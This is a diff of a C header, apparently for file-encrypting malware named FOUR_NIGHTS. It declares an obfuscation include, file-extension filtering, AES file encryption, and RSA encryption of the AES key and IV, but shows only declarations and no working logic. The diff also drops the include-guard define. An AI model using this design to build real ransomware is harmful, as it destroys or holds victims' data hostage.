@@ -1,13 +1,7 @@
 #ifndef FOUR_NIGHTS
-#define FOUR_NIGHTS
-
 #ifndef NO_OBFUSCATION
   #include "obfuscation.h"
 #endif
-
-#include <openssl/aes.h>
-#include <openssl/evp.h>
-#include <openssl/rand.h>
 
 #include <dirent.h>
 #include <limits.h>
@@ -19,8 +13,13 @@
 #include <sys/utsname.h>
 #include <unistd.h>
 
+#include <openssl/evp.h>
+
+
 #define BIGBUF  8192 /* 8KiB */
 #define PATH_MAX 4096
+#define AES_BLOCK_SIZE 16
+
 
 /**
   * struct tmp_bufs_s - refillable buffers for each target file
@@ -51,7 +50,6 @@ void free_tmp_bufs_struct(tmp_bufs_t tmp_bufs);
  **/
 typedef struct file_filter_s
 {
-	char *root_path;
 	char *file_exts_whole_str;
 	char **file_extensions;
 	char cipher_flag;
@@ -80,6 +78,11 @@ unsigned char *aes_decrypt(EVP_CIPHER_CTX *d,
 							unsigned char *ciphertext,
 							int *len);
 int check_padding(unsigned char *filepath, size_t size);
+
+int rsa_public_encrypt(unsigned char *dec, int data_len, unsigned char *enc);
+int rsa_private_decrypt(unsigned char *enc, int data_len, unsigned char *dec);
+int encrypt_key_iv(unsigned char *key, unsigned char *iv);
+int decrypt_key_iv(unsigned char *key, unsigned char *iv);
 
 /* DEBUGGING */
 #ifndef NO_DEBUG
